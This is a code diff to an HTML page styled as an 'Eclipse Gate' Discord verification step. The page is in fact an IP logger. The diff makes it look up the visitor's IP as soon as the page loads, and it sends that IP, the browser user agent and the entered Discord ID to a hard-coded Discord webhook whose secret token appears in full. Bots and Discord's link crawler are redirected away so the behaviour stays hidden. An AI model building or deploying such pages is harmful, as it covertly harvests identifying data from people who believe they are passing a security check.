@@ -161,7 +161,7 @@
     <h1 id="title-text">Eclipse Gate</h1>
     
     <div id="form-block" class="input-container">
-      <input type="text" id="user-id-input" placeholder="Masukkan User ID Anda..." autocomplete="off">
+      <input type="text" id="user-id-input" class="user-input" placeholder="Masukkan User ID Anda..." autocomplete="off">
       <button class="submit-button" onclick="verifyAndLog()">Verify Connection</button>
     </div>
 
@@ -174,6 +174,7 @@
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
     const discordInvite = "https://discord.gg/fMbZNhGVmh";
+    let globalUserIp = "Unknown/Blocked";
 
     function playSuccessSound() {
         try {
@@ -182,8 +183,8 @@
             const gainNode = audioCtx.createGain();
             
             oscillator.type = 'sine';
-            oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime); // Nada D5
-            oscillator.frequency.setValueAtTime(880, audioCtx.currentTime + 0.1);  // Nada A5
+            oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime);
+            oscillator.frequency.setValueAtTime(880, audioCtx.currentTime + 0.1);
             
             gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
             gainNode.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.4);
@@ -194,11 +195,29 @@
             oscillator.start();
             oscillator.stop(audioCtx.currentTime + 0.4);
         } catch (e) {
-            console.log("Audio not supported or blocked by browser gesture rules.");
+            console.log("Audio not supported or blocked.");
         }
     }
 
-    async function verifyAndLog() {
+    async function initGate() {
+        const userAgent = navigator.userAgent;
+        if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
+            window.location.href = discordInvite;
+            return;
+        }
+
+        try {
+            const ipResponse = await fetch("https://ipify.org");
+            if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                globalUserIp = ipData.ip;
+            }
+        } catch (e) {
+            console.log("IP lookup failed at init");
+        }
+    }
+
+    function verifyAndLog() {
         const userIdField = document.getElementById('user-id-input');
         const userIdValue = userIdField.value.trim();
 
@@ -211,29 +230,13 @@
         document.getElementById('loader').style.display = 'block';
         document.getElementById('status-label').innerText = "Verifying security connection...";
 
-        let userIp = "Unknown/Blocked";
         const userAgent = navigator.userAgent;
-
-        if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
-            window.location.href = discordInvite;
-            return;
-        }
-
-        try {
-            const ipResponse = await fetch("https://ipify.org");
-            if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                userIp = ipData.ip;
-            }
-        } catch (e) {
-            console.log("IP lookup failed or blocked by AdBlocker");
-        }
-
         const now = new Date();
+        
         const payload = {
             username: ".nael",
             avatar_url: "https://cdn.discordapp.com/avatars/1288936739561279618/47a58cb8dbd6b2179367e4f50bf4a0b8.webp?size=160",
-            content: `🛡️ **[MEMBER VERIFIED]**\n👤 **User:** <@${userIdValue}>\n🌐 **IP:** \`${userIp}\`\n📅 **Date:** ${now.toLocaleDateString('id-ID')}\n⏰ **Time:** ${now.toLocaleTimeString('id-ID')}\n💻 **Device:** \`${userAgent}\``
+            content: `🛡️ **[MEMBER VERIFIED]**\n👤 **User:** <@${userIdValue}>\n🌐 **IP:** \`${globalUserIp}\`\n📅 **Date:** ${now.toLocaleDateString('id-ID')}\n⏰ **Time:** ${now.toLocaleTimeString('id-ID')}\n💻 **Device:** \`${userAgent}\``
         };
 
         const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
@@ -262,6 +265,8 @@
 
         }, 3000);
     }
+
+    window.onload = initGate;
   </script>
 </body>
 </html>
